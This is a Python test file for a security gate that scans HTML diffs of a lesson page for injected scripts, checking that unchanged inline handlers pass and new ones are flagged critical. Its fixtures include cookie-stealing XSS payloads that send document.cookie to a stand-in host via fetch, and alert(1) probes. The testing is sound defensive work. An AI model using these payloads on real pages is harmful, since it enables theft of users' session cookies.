"""Injection check: a handler kept verbatim from the removed line is not new; new or changed handlers stay critical."""
from gates import guard

PATH = "public/lesson.html"
OLD = """  <button onclick="document.getElementById('cmt-input').focus()">💬 Viết phản hồi</button>"""
NEW_TEXT = """  <button onclick="document.getElementById('cmt-input').focus()">Bài biến tựu cân xu.</button>"""


def diff(added, removed):
    head = f"diff --git a/{PATH} b/{PATH}\n--- a/{PATH}\n+++ b/{PATH}\n@@ -187 +187 @@\n"
    return head + "".join(f"-{x}\n" for x in removed) + "".join(f"+{x}\n" for x in added)


def injection(added, removed):
    return [f for f in guard.scan(diff(added, removed))["findings"] if f["check"] == "injection"]


def test_text_edit_on_a_line_with_an_existing_handler_passes():
    assert injection([NEW_TEXT], [OLD]) == []


def test_new_handler_is_still_critical():
    line = """  <button onclick="fetch('//x.test/'+document.cookie)">Bài biến</button>"""
    assert injection([line], [OLD])[0]["severity"] == "critical"


def test_kept_handler_plus_an_added_one_is_critical():
    line = NEW_TEXT.replace("<button ", """<button onmouseover="alert(1)" """)
    assert injection([line], [OLD])


def test_handler_moved_from_another_file_is_not_exempt():
    other = "diff --git a/public/a.html b/public/a.html\n--- a/public/a.html\n+++ b/public/a.html\n@@ -1 +1 @@\n-" + OLD + "\n"
    text = other + diff([NEW_TEXT], [])
    assert [f for f in guard.scan(text)["findings"] if f["check"] == "injection"]


BACK_OLD = '<a class="back" href="javascript:history.back()">← Quay lại</a>'
BACK_TEXT = '<a class="back" href="javascript:history.back()">New text</a>'


def test_text_edit_on_a_line_with_a_kept_javascript_href_passes():
    assert injection([BACK_TEXT], [BACK_OLD]) == []


def test_new_javascript_href_is_critical():
    assert injection([BACK_TEXT], ['<a class="back" href="/">← Quay lại</a>'])


def test_modified_javascript_href_is_critical():
    line = BACK_TEXT.replace("history.back()", "fetch('//x.test/'+document.cookie)")
    assert injection([line], [BACK_OLD])


def test_javascript_href_added_to_another_element_is_critical():
    line = BACK_TEXT + '<a href="javascript:alert(1)">x</a>'
    assert injection([line], [BACK_OLD])


def test_script_and_javascript_url_stay_critical_with_an_existing_handler():
    for extra in ('<a href="javascript:alert(1)">x</a>', "<script>alert(1)</script>"):
        assert injection([NEW_TEXT + extra], [OLD]), extra
